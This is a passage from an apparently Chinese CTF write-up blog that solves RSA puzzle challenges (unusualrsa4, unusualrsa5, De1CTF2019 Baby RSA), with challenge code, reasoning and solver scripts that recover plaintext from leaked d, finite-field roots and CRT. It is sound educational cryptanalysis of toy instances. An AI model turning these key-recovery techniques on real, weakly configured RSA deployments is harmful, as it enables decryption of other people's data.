<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ********************</span></span><br><span class="line"><span class="comment"># @Author: Lazzaro</span></span><br><span class="line"><span class="comment"># ********************</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,bytes_to_long</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p*q</span><br><span class="line"><span class="built_in">print</span>(invert(q,p))</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">q_1 = <span class="number">113350138578125471637271827037682321496361317426731366252238155037440385105997423113671392038498349668206564266165641194668802966439465128197299073392773586475372002967691512324151673246253769186679521811837698540632534357656221715752733588763108463093085549826122278822507051740839450621887847679420115044512</span></span><br><span class="line">d = <span class="number">27451162557471435115589774083548548295656504741540442329428952622804866596982747294930359990602468139076296433114830591568558281638895221175730257057177963017177029796952153436494826699802526267315286199047856818119832831065330607262567182123834935483241720327760312585050990828017966534872294866865933062292893033455722786996125448961180665396831710915882697366767203858387536850040283296013681157070419459208544201363726008380145444214578735817521392863391376821427153094146080055636026442795625833039248405951946367504865008639190248509000950429593990524808051779361516918410348680313371657111798761410501793645137</span></span><br><span class="line">c = <span class="number">619543409290228183446186073184791934402487500047968659800765382797769750763696880547221266055431306972840980865602729031475343233357485820872268765911041297456664938715949124290204230537793877747551374176167292845717246943780371146830637073310108630812389581197831196039107931968703635129091224513813241403591357678410312272233389708366642638825455844282490676862737715585788829936919637988039113463707959069907015464745700766013573282604376277598510224455044288896809217461295080140187509519005245601483583507547733673523120385089098002298314719617693895392148294399937798485146568296114338393548124451378170302291</span></span><br></pre></td></tr></table></figure>

<p>两条hint</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210708160443773.png" alt="unusualrsa4hint1"></p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210708160508649.png" alt="unusualrsa4hint2"></p>
<blockquote>
<p>解题思路</p>
</blockquote>
<p>题目很简介，把d告诉我们，但是没告诉n</p>
<p>可以想到d泄露攻击；可惜d泄露是分解n用的</p>
<p>但知道<br>$$<br>q_1\times q\equiv\ 1(mod\ p)<br>$$<br>可恶看着hint还是做不出来。从第一个hint可以将那个式子化简<br>$$<br>q_1\times \varphi \equiv (q_1-1)\ mod\ p<br>$$<br>这一步比较简单，有手就行，接下里有点难想；移位一下上式得到<br>$$<br>q1\times \varphi-q_1+1\equiv 0\ mod\ p<br>$$<br>即，$q_1\times \varphi-q_1+1$是p的倍数</p>
<p>令$k_p=q_1\cdot\varphi-q_1+1$，则对任意的g，$gcd(g,p)=1$，有<br>$$<br>g^\varphi \equiv1\ mod\ p\Rightarrow (g^\varphi\ mod\ k_p) \equiv1\ mod\ p<br>$$<br>这一步是由第二个hint的第二点得来的，因为p是kp的因子</p>
<p>接下来你知道怎么做了了吧</p>
<p>很好，不知道！诶嘿，我也不说，就是玩儿。</p>
<blockquote>
<p>脚本编写</p>
</blockquote>
<p>什么？你说$\varphi$不知道？——我听不见</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">q_1 = <span class="number">113350138578125471637271827037682321496361317426731366252238155037440385105997423113671392038498349668206564266165641194668802966439465128197299073392773586475372002967691512324151673246253769186679521811837698540632534357656221715752733588763108463093085549826122278822507051740839450621887847679420115044512</span></span><br><span class="line">d = <span class="number">27451162557471435115589774083548548295656504741540442329428952622804866596982747294930359990602468139076296433114830591568558281638895221175730257057177963017177029796952153436494826699802526267315286199047856818119832831065330607262567182123834935483241720327760312585050990828017966534872294866865933062292893033455722786996125448961180665396831710915882697366767203858387536850040283296013681157070419459208544201363726008380145444214578735817521392863391376821427153094146080055636026442795625833039248405951946367504865008639190248509000950429593990524808051779361516918410348680313371657111798761410501793645137</span></span><br><span class="line">c = <span class="number">619543409290228183446186073184791934402487500047968659800765382797769750763696880547221266055431306972840980865602729031475343233357485820872268765911041297456664938715949124290204230537793877747551374176167292845717246943780371146830637073310108630812389581197831196039107931968703635129091224513813241403591357678410312272233389708366642638825455844282490676862737715585788829936919637988039113463707959069907015464745700766013573282604376277598510224455044288896809217461295080140187509519005245601483583507547733673523120385089098002298314719617693895392148294399937798485146568296114338393548124451378170302291</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e):</span><br><span class="line">    <span class="comment"># 枚举phi</span></span><br><span class="line">    t = e * d - <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> t % k == <span class="number">0</span>:</span><br><span class="line">        phi = t // k</span><br><span class="line">        kp = q_1 * phi - q_1 + <span class="number">1</span></span><br><span class="line">        x1 = <span class="built_in">pow</span>(<span class="number">3</span>, phi, kp) - <span class="number">1</span></span><br><span class="line">        x2 = <span class="built_in">pow</span>(<span class="number">5</span>, phi, kp) - <span class="number">1</span></span><br><span class="line">        x = gcd(x1, x2)</span><br><span class="line">        <span class="keyword">if</span> x.bit_length() == <span class="number">1024</span>:</span><br><span class="line">            p = x</span><br><span class="line">            q = invert(q_1, p)</span><br><span class="line">            n, phi = p*q, (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">assert</span> d == invert(e, phi)</span><br><span class="line">            m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">            <span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>我看着showwp上大佬写的，我直接用3和5作为那个质数了，理论上应该选任意两个都可以的吧</p>
<h2 id="unusualrsa5"><a href="#unusualrsa5" class="headerlink" title="unusualrsa5"></a>unusualrsa5</h2><blockquote>
<p>题目描述</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ********************</span></span><br><span class="line"><span class="comment"># @Author: Lazzaro</span></span><br><span class="line"><span class="comment"># ********************</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x14</span></span><br><span class="line">p = <span class="number">733089589724903586073820965792963746076789390539824437962807679954808310072656817423828613938510684864567664345751164944269489647964227519307980688068059059377123391499328155025962198363435968318689113750910755244276996554328840879221120846257832190569086861774466785101694608744384540722995426474322431441</span></span><br><span class="line">q = <span class="number">771182695213910447650732428220054698293987458796864628535794956332865106301119308051373568460701145677164052375651484670636989109023957702790185901445649197004100341656188532246838220216919835415376078688888076677350412398198442910825884505318258393640994788407100699355386681624118606588957344077387058721</span></span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#406314720119562590605554101860453913891646775958515375190169046313074168423687276987576196367702523895650602252851191274766072774312855212771035294337840170341052016067631007495713764510925931612800335613551752201920460877432379214684677593342046715833439574705829048358675771542989832566579493199671622475225225451781214904100440695928239014046619329247750637911015313431804069312072581674845078940868349474663382442540424342613429896445329365750444298236684237769335405534090013035238333534521759502103604033307768304224154383880727399879024077733935062478113298538634071453067782212909271392163928445051705642</span></span><br></pre></td></tr></table></figure>

<p>放了一个hint</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210708175122579.png" alt="unusualrsa5hint"></p>
<blockquote>
<p>解题思路</p>
</blockquote>
<p>来了，终于来了</p>
<p>有限域开方，先纪念一下Striving师傅给的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line">p = <span class="number">733089589724903586073820965792963746076789390539824437962807679954808310072656817423828613938510684864567664345751164944269489647964227519307980688068059059377123391499328155025962198363435968318689113750910755244276996554328840879221120846257832190569086861774466785101694608744384540722995426474322431441</span></span><br><span class="line">q = <span class="number">771182695213910447650732428220054698293987458796864628535794956332865106301119308051373568460701145677164052375651484670636989109023957702790185901445649197004100341656188532246838220216919835415376078688888076677350412398198442910825884505318258393640994788407100699355386681624118606588957344077387058721</span></span><br><span class="line">n = <span class="number">9057141637995599750120273501711128117576789048411357158233050845658505488383724832915968443730006384810721595601723748471745315354759415044859624198755098491311647992728384572103262800310263916249536898582100747311978019829291619921741682336800665277699122504431456051606407509905004993708771825443764723285750825546500765451509998514747599779552241055519485714649825416851221219747115910385536482995890893190128149999622905611239433481756073333147782531765685320972075370276543786386451560493093416152466142374684450770169257924330366774896526508005296520372463932722237001341584625279676089901419404816917142209281664709940400762785892142918132066900664643155176180059403739</span></span><br><span class="line">c = <span class="number">406314720119562590605554101860453913891646775958515375190169046313074168423687276987576196367702523895650602252851191274766072774312855212771035294337840170341052016067631007495713764510925931612800335613551752201920460877432379214684677593342046715833439574705829048358675771542989832566579493199671622475225225451781214904100440695928239014046619329247750637911015313431804069312072581674845078940868349474663382442540424342613429896445329365750444298236684237769335405534090013035238333534521759502103604033307768304224154383880727399879024077733935062478113298538634071453067782212909271392163928445051705642</span></span><br><span class="line">e= <span class="number">20</span></span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(p)[]</span><br><span class="line">f = x ^ e - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res1 = f.roots()</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(q)[]</span><br><span class="line">f = x ^ e - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res2 = f.roots()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> res2:</span><br><span class="line">        <span class="comment"># 普普通通中国剩余定理</span></span><br><span class="line">        m = crt(<span class="built_in">int</span>(i[<span class="number">0</span>]),<span class="built_in">int</span>(j[<span class="number">0</span>]),p,q)</span><br><span class="line">        flag = long_to_bytes(m)</span><br><span class="line">        <span class="keyword">if</span> flag.startswith(<span class="string">b&#x27;flag&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>之前中国海洋大学那道题是e=64，要分成16*4或者8*8来做</p>
<p>此外，还有几种不可行的思路</p>
<p>老办法rabin，但是20=2*2*5每一个质数都和phi有公因子，巧了</p>
<p>就算最后开到$c^5$，用小指数的脚本也跑不出来</p>
<p>对于5，平方根算法也无能为力</p>
<p>好吧，该来总会来的</p>
<blockquote>
<p>有限域开方</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f.roots()</span><br></pre></td></tr></table></figure>

<p>好，结束！</p>
<p>其实有限域开方和rabin挺像，一个可以开多次，一个只能开二次</p>
<p>以模p下的为例</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">R.&lt;x&gt; = Zmod(p)[]</span><br><span class="line">f = x ^ e - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res1 = f.roots()</span><br></pre></td></tr></table></figure>

<p>求出来的解（可能有多个，因为多项式的解嘛），然后继续开，可能一次开的次数不能太大，不然时间会很慢，然后用中国剩余定理，因为求出来的解都是在模各自模数下的</p>
<p>至于里面什么原理，达斯给碟</p>
<p>la佬yyds，看着la佬的博客长大</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210708203043872.png" alt="image-20210708203043872"></p>
<p>看看la佬推荐的两道题目</p>
<h3 id="De1CTF2019-Baby-RSA"><a href="#De1CTF2019-Baby-RSA" class="headerlink" title="De1CTF2019-Baby RSA"></a>De1CTF2019-Baby RSA</h3><blockquote>
<p>题目描述</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> data <span class="keyword">import</span> e1,e2,p,q1p,q1q,hint,flag</span><br><span class="line"></span><br><span class="line">n =  [<span class="number">20129615352491765499340112943188317180548761597861300847305827141510465619670536844634558246439230371658836928103063432870245707180355907194284861510906071265352409579441048101084995923962148527097370705452070577098780246282820065573711015664291991372085157016901209114191068574208680397710042842835940428451949500607613634682684113208766694028789275748528254287705759528498986306494267817198340658241873024800336013946294891687591013414935237821291805123285905335762719823771647853378892868896078424572232934360940672962436849523915563328779942134504499568866135266628078485232098208237036724121481835035731201383423L</span>, <span class="number">31221650155627849964466413749414700613823841060149524451234901677160009099014018926581094879840097248543411980533066831976617023676225625067854003317018794041723612556008471579060428898117790587991055681380408263382761841625714415879087478072771968160384909919958010983669368360788505288855946124159513118847747998656422521414980295212646675850690937883764000571667574381419144372824211798018586804674824564606122592483286575800685232128273820087791811663878057827386379787882962763290066072231248814920468264741654086011072638211075445447843691049847262485759393290853117072868406861840793895816215956869523289231421L</span>, <span class="number">29944537515397953361520922774124192605524711306753835303703478890414163510777460559798334313021216389356251874917792007638299225821018849648520673813786772452822809546571129816310207232883239771324122884804993418958309460009406342872173189008449237959577469114158991202433476710581356243815713762802478454390273808377430685157110095496727966308001254107517967559384019734279861840997239176254236069001453544559786063915970071130087811123912044312219535513880663913831358790376650439083660611831156205113873793106880255882114422025746986403355066996567909581710647746463994280444700922867397754748628425967488232530303L</span>, <span class="number">25703437855600135215185778453583925446912731661604054184163883272265503323016295700357253105301146726667897497435532579974951478354570415554221401778536104737296154316056314039449116386494323668483749833147800557403368489542273169489080222009368903993658498263905567516798684211462607069796613434661148186901892016282065916190920443378756167250809872483501712225782004396969996983057423942607174314132598421269169722518224478248836881076484639837343079324636997145199835034833367743079935361276149990997875905313642775214486046381368619638551892292787783137622261433528915269333426768947358552919740901860982679180791L</span>]</span><br><span class="line">c =  [<span class="number">19131432661217908470262338421299691998526157790583544156741981238822158563988520225986915234570037383888112724408392918113942721994125505014727545946133307329781747600302829588248042922635714391033431930411180545085316438084317927348705241927570432757892985091396044950085462429575440060652967253845041398399648442340042970814415571904057667028157512971079384601724816308078631844480110201787343583073815186771790477712040051157180318804422120472007636722063989315320863580631330647116993819777750684150950416298085261478841177681677867236865666207391847046483954029213495373613490690687473081930148461830425717614569L</span>, <span class="number">15341898433226638235160072029875733826956799982958107910250055958334922460202554924743144122170018355117452459472017133614642242411479849369061482860570279863692425621526056862808425135267608544855833358314071200687340442512856575278712986641573012456729402660597339609443771145347181268285050728925993518704899005416187250003304581230701444705157412790787027926810710998646191467130550713600765898234392350153965811595060656753711278308005193370936296124790772689433773414703645703910742193898471800081321469055211709339846392500706523670145259024267858368216902176489814789679472227343363035428541915118378163012031L</span>, <span class="number">18715065071648040017967211297231106538139985087685358555650567057715550586464814763683688299037897182845007578571401359061213777645114414642903077003568155508465819628553747173244235936586812445440095450755154357646737087071605811984163416590278352605433362327949048243722556262979909488202442530307505819371594747936223835233586945423522256938701002370646382097846105014981763307729234675737702252155130837154876831885888669150418885088089324534892506199724486783446267336789872782137895552509353583305880144947714110009893134162185382309992604435664777436197587312317224862723813510974493087450281755452428746194446L</span>, <span class="number">2282284561224858293138480447463319262474918847630148770112472703128549032592187797289965592615199709857879008271766433462032328498580340968871260189669707518557157836592424973257334362931639831072584824103123486522582531666152363874396482744561758133655406410364442174983227005501860927820871260711861008830120617056883514525798709601744088135999465598338635794275123149165498933580159945032363880613524921913023341209439657145962332213468573402863796920571812418200814817086234262280338221161622789516829363805084715652121739036183264026120868756523770196284142271849879003202190966150390061195469351716819539183797L</span>]</span><br><span class="line">f=<span class="keyword">lambda</span> m,e,n,c:<span class="built_in">pow</span>(m,e,n)==c</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">sum</span>(<span class="built_in">map</span>(f,[p]*<span class="number">4</span>,[<span class="number">4</span>]*<span class="number">4</span>,n,c))==<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">ee1 = <span class="number">42</span></span><br><span class="line">ee2 = <span class="number">3</span></span><br><span class="line">ce1 =  <span class="number">45722651786340123946960815003059322528810481841378247280642868553607692149509126962872583037142461398806689489141741494974836882341505234255325683219092163052843461632338442529011502378931140356111756932712822516814023166068902569458299933391973504078898958921809723346229893913662577294963528318424676803942288386430172430880307619748186863890050113934573820505570928109017842647598266634344447182347849367714564686341871007505886728393751147033556889217604647355628557502208364412269944908011305064122941446516990168924709684092200183860653173856272384</span></span><br><span class="line">ce2 =  <span class="number">13908468332333567158469136439932325992349696889129103935400760239319454409539725389747059213835238373047899198211128689374049729578146875309231962936554403287882999967840346216695208424582739777034261079550395918048421086843927009452479936045850799096750074359160775182238980989229190157551197830879877097703347301072427149474991803868325769967332356950863518504965486565464059770451458557744949735282131727956056279292800694203866167270268988437389945703117070604488999247750139568614939965885211276821987586882908159585863514561191905040244967655444219603287214405014887994238259270716355378069726760953320025828158</span></span><br><span class="line">tmp =  <span class="number">864078778078609835167779565982540757684070450697854309005171742813414963447462554999012718960925081621571487444725528982424037419052194840720949809891134854871222612682162490991065015935449289960707882463387</span></span><br><span class="line">n  =  <span class="number">15911581555796798614711625288508309704791837516232122410440958830726078821069050404012820896260071751380436992710638364294658173571101596931605797509712839622479368850251206419748090059752427303611760004621378226431226983665746837779056271530181865648115862947527212787824629516204832313026456390047768174765687040950636530480549014401279054346098030395100387004111574278813749630986724706263655166289586230453975953773791945408589484679371854113457758157492241225180907090235116325034822993748409011554673180494306003272836905082473475046277554085737627846557240367696214081276345071055578169299060706794192776825039</span></span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">pow</span>(e1,ee1,n)==ce1)</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">pow</span>(e2+tmp,ee2,n)==ce2)</span><br><span class="line"></span><br><span class="line">e = <span class="number">46531</span></span><br><span class="line">n = <span class="number">16278524034278364842964386062476113517067911891699789991355982121084973951738324063305190630865511554888330215827724887964565979607808294168282995825864982603759381323048907814961279012375346497781046417204954101076457350988751188332353062731641153547102721113593787978587135707313755661153376485647168543680503160420091693269984008764444291289486805840439906620313162344057956594836197521501755378387944609246120662335790110901623740990451586621846212047950084207251595169141015645449217847180683357626383565631317253913942886396494396189837432429078251573229378917400841832190737518763297323901586866664595327850603</span></span><br><span class="line">c = <span class="number">14992132140996160330967307558503117255626925777426611978518339050671013041490724616892634911030918360867974894371539160853827180596100892180735770688723270765387697604426715670445270819626709364566478781273676115921657967761494619448095207169386364541164659123273236874649888236433399127407801843412677293516986398190165291102109310458304626261648346825196743539220198199366711858135271877662410355585767124059539217274691606825103355310348607611233052725805236763220343249873849646219850954945346791015858261715967952461021650307307454434510851869862964236227932964442289459508441345652423088404453536608812799355469</span></span><br><span class="line">hint=<span class="built_in">int</span>(binascii.hexlify(hint),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">assert</span>(q1p*q1q==n)</span><br><span class="line"><span class="keyword">assert</span>(q1p&lt;q1q)</span><br><span class="line"><span class="keyword">assert</span>(c==<span class="built_in">pow</span>(hint,e,n))</span><br><span class="line"></span><br><span class="line">flag=<span class="built_in">int</span>(binascii.hexlify(flag),<span class="number">16</span>)</span><br><span class="line">q1=q1p</span><br><span class="line">q2 =  <span class="number">114401188227479584680884046151299704656920536168767132916589182357583461053336386996123783294932566567773695426689447410311969456458574731187512974868297092638677515283584994416382872450167046416573472658841627690987228528798356894803559278308702635288537653192098514966089168123710854679638671424978221959513</span></span><br><span class="line">c1 =  <span class="number">262739975753930281690942784321252339035906196846340713237510382364557685379543498765074448825799342194332681181129770046075018122033421983227887719610112028230603166527303021036386350781414447347150383783816869784006598225583375458609586450854602862569022571672049158809874763812834044257419199631217527367046624888837755311215081173386523806086783266198390289097231168172692326653657393522561741947951887577156666663584249108899327053951891486355179939770150550995812478327735917006194574412518819299303783243886962455399783601229227718787081785391010424030509937403600351414176138124705168002288620664809270046124</span></span><br><span class="line">c2 =  <span class="number">7395591129228876649030819616685821899204832684995757724924450812977470787822266387122334722132760470911599176362617225218345404468270014548817267727669872896838106451520392806497466576907063295603746660003188440170919490157250829308173310715318925771643105064882620746171266499859049038016902162599261409050907140823352990750298239508355767238575709803167676810456559665476121149766947851911064706646506705397091626648713684511780456955453552020460909638016134124590438425738826828694773960514221910109473941451471431637903182205738738109429736425025621308300895473186381826756650667842656050416299166317372707709596</span></span><br><span class="line"><span class="keyword">assert</span>(c1==<span class="built_in">pow</span>(flag,e1,p*q1))</span><br><span class="line"><span class="keyword">assert</span>(c2==<span class="built_in">pow</span>(flag,e2,p*q2))</span><br></pre></td></tr></table></figure>

<blockquote>
<p>解题思路</p>
</blockquote>
<p>还是考这一类型的，无非就是多套了几层，想要求flag，就要知道e1，e2，q1p，p，想要求e1和e2，看这一步</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ee1 = <span class="number">42</span></span><br><span class="line">ee2 = <span class="number">3</span></span><br><span class="line">ce1 =  <span class="number">45722651786340123946960815003059322528810481841378247280642868553607692149509126962872583037142461398806689489141741494974836882341505234255325683219092163052843461632338442529011502378931140356111756932712822516814023166068902569458299933391973504078898958921809723346229893913662577294963528318424676803942288386430172430880307619748186863890050113934573820505570928109017842647598266634344447182347849367714564686341871007505886728393751147033556889217604647355628557502208364412269944908011305064122941446516990168924709684092200183860653173856272384</span></span><br><span class="line">ce2 =  <span class="number">13908468332333567158469136439932325992349696889129103935400760239319454409539725389747059213835238373047899198211128689374049729578146875309231962936554403287882999967840346216695208424582739777034261079550395918048421086843927009452479936045850799096750074359160775182238980989229190157551197830879877097703347301072427149474991803868325769967332356950863518504965486565464059770451458557744949735282131727956056279292800694203866167270268988437389945703117070604488999247750139568614939965885211276821987586882908159585863514561191905040244967655444219603287214405014887994238259270716355378069726760953320025828158</span></span><br><span class="line">tmp =  <span class="number">864078778078609835167779565982540757684070450697854309005171742813414963447462554999012718960925081621571487444725528982424037419052194840720949809891134854871222612682162490991065015935449289960707882463387</span></span><br><span class="line">n  =  <span class="number">15911581555796798614711625288508309704791837516232122410440958830726078821069050404012820896260071751380436992710638364294658173571101596931605797509712839622479368850251206419748090059752427303611760004621378226431226983665746837779056271530181865648115862947527212787824629516204832313026456390047768174765687040950636530480549014401279054346098030395100387004111574278813749630986724706263655166289586230453975953773791945408589484679371854113457758157492241225180907090235116325034822993748409011554673180494306003272836905082473475046277554085737627846557240367696214081276345071055578169299060706794192776825039</span></span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">pow</span>(e1,ee1,n)==ce1)</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">pow</span>(e2+tmp,ee2,n)==ce2)</span><br></pre></td></tr></table></figure>

<p>e2加了一个padding，然后e=3可以用小指数解法，解出来减去tmp，得到</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e2 = <span class="number">381791429275130</span></span><br></pre></td></tr></table></figure>

<p>e1，和e2来个共模吧，我这里创造$e_1^{42}\ mod\ n$，相当于将ce1再做14次方模n，不知道可不可以</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e1 = <span class="number">184248803833368144507527482158254753456102436059792328559167056890008204564668583544316791778931084172047297608264133909324009314707553896235635211639233133607363861712312892361118629527362064961787009695248597106804395627805255359474989451093529378647565056831703141799794943273776382312947143190802046158174097138203112776712258154475273727098422965989978011736787396669332311941508114626948324330803438970382219225484642872929809644529306909820478119024559071046283253694826736959026215034831382526368076042757610908885320508141057588387594673572835966476324777431647490645334325605016262755417205130618921341925</span></span><br></pre></td></tr></table></figure>

<p>e1有这么大？接下来求flag那一层的n了</p>
<p>看第一个</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = [<span class="number">20129615352491765499340112943188317180548761597861300847305827141510465619670536844634558246439230371658836928103063432870245707180355907194284861510906071265352409579441048101084995923962148527097370705452070577098780246282820065573711015664291991372085157016901209114191068574208680397710042842835940428451949500607613634682684113208766694028789275748528254287705759528498986306494267817198340658241873024800336013946294891687591013414935237821291805123285905335762719823771647853378892868896078424572232934360940672962436849523915563328779942134504499568866135266628078485232098208237036724121481835035731201383423L</span>, <span class="number">31221650155627849964466413749414700613823841060149524451234901677160009099014018926581094879840097248543411980533066831976617023676225625067854003317018794041723612556008471579060428898117790587991055681380408263382761841625714415879087478072771968160384909919958010983669368360788505288855946124159513118847747998656422521414980295212646675850690937883764000571667574381419144372824211798018586804674824564606122592483286575800685232128273820087791811663878057827386379787882962763290066072231248814920468264741654086011072638211075445447843691049847262485759393290853117072868406861840793895816215956869523289231421L</span>, <span class="number">29944537515397953361520922774124192605524711306753835303703478890414163510777460559798334313021216389356251874917792007638299225821018849648520673813786772452822809546571129816310207232883239771324122884804993418958309460009406342872173189008449237959577469114158991202433476710581356243815713762802478454390273808377430685157110095496727966308001254107517967559384019734279861840997239176254236069001453544559786063915970071130087811123912044312219535513880663913831358790376650439083660611831156205113873793106880255882114422025746986403355066996567909581710647746463994280444700922867397754748628425967488232530303L</span>, <span class="number">25703437855600135215185778453583925446912731661604054184163883272265503323016295700357253105301146726667897497435532579974951478354570415554221401778536104737296154316056314039449116386494323668483749833147800557403368489542273169489080222009368903993658498263905567516798684211462607069796613434661148186901892016282065916190920443378756167250809872483501712225782004396969996983057423942607174314132598421269169722518224478248836881076484639837343079324636997145199835034833367743079935361276149990997875905313642775214486046381368619638551892292787783137622261433528915269333426768947358552919740901860982679180791L</span>]</span><br><span class="line">c = [<span class="number">19131432661217908470262338421299691998526157790583544156741981238822158563988520225986915234570037383888112724408392918113942721994125505014727545946133307329781747600302829588248042922635714391033431930411180545085316438084317927348705241927570432757892985091396044950085462429575440060652967253845041398399648442340042970814415571904057667028157512971079384601724816308078631844480110201787343583073815186771790477712040051157180318804422120472007636722063989315320863580631330647116993819777750684150950416298085261478841177681677867236865666207391847046483954029213495373613490690687473081930148461830425717614569L</span>, <span class="number">15341898433226638235160072029875733826956799982958107910250055958334922460202554924743144122170018355117452459472017133614642242411479849369061482860570279863692425621526056862808425135267608544855833358314071200687340442512856575278712986641573012456729402660597339609443771145347181268285050728925993518704899005416187250003304581230701444705157412790787027926810710998646191467130550713600765898234392350153965811595060656753711278308005193370936296124790772689433773414703645703910742193898471800081321469055211709339846392500706523670145259024267858368216902176489814789679472227343363035428541915118378163012031L</span>, <span class="number">18715065071648040017967211297231106538139985087685358555650567057715550586464814763683688299037897182845007578571401359061213777645114414642903077003568155508465819628553747173244235936586812445440095450755154357646737087071605811984163416590278352605433362327949048243722556262979909488202442530307505819371594747936223835233586945423522256938701002370646382097846105014981763307729234675737702252155130837154876831885888669150418885088089324534892506199724486783446267336789872782137895552509353583305880144947714110009893134162185382309992604435664777436197587312317224862723813510974493087450281755452428746194446L</span>, <span class="number">2282284561224858293138480447463319262474918847630148770112472703128549032592187797289965592615199709857879008271766433462032328498580340968871260189669707518557157836592424973257334362931639831072584824103123486522582531666152363874396482744561758133655406410364442174983227005501860927820871260711861008830120617056883514525798709601744088135999465598338635794275123149165498933580159945032363880613524921913023341209439657145962332213468573402863796920571812418200814817086234262280338221161622789516829363805084715652121739036183264026120868756523770196284142271849879003202190966150390061195469351716819539183797L</span>]</span><br><span class="line">f = <span class="keyword">lambda</span> m, e, n, c:<span class="built_in">pow</span>(m, e, n) == c</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">sum</span>(<span class="built_in">map</span>(f, [p]*<span class="number">4</span>, [<span class="number">4</span>]*<span class="number">4</span>, n, c)) == <span class="number">4</span>)</span><br></pre></td></tr></table></figure>

<p>e=4，各种方法试过了，不太行。麻了呀，瞟了一眼WP，这不是四个同余式吗？直接crt一梭子，最后别忘了开个方</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = <span class="number">109935857933867829728985398563235455481120300859311421762540858762721955038310117609456763338082237907005937380873151279351831600225270995344096532750271070807051984097524900957809427861441436796934012393707770012556604479065826879107677002380580866325868240270494148512743861326447181476633546419262340100453</span></span><br></pre></td></tr></table></figure>

<p>然后还有一个hint没求出来，对于那个n，factordb好分。求出来hint，哦，似曾相识的场景</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">orz...you.found.me.but.sorry.no.hint...keep.on.and.enjoy.it!</span><br></pre></td></tr></table></figure>

<p>但是没事，我们得到了q1p和q1q；接下来有两条思路，一是通过e1这条，因为求得e1很大，但是感觉e1求出来有问题，而且也不满足Wiener和boneh_durfee的两个条件，所以暂时没有思路；二是通过e2这条路，因为e2分解得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2 * 5 * 7 * 89 * 643 * 1063 * 89659</span><br></pre></td></tr></table></figure>

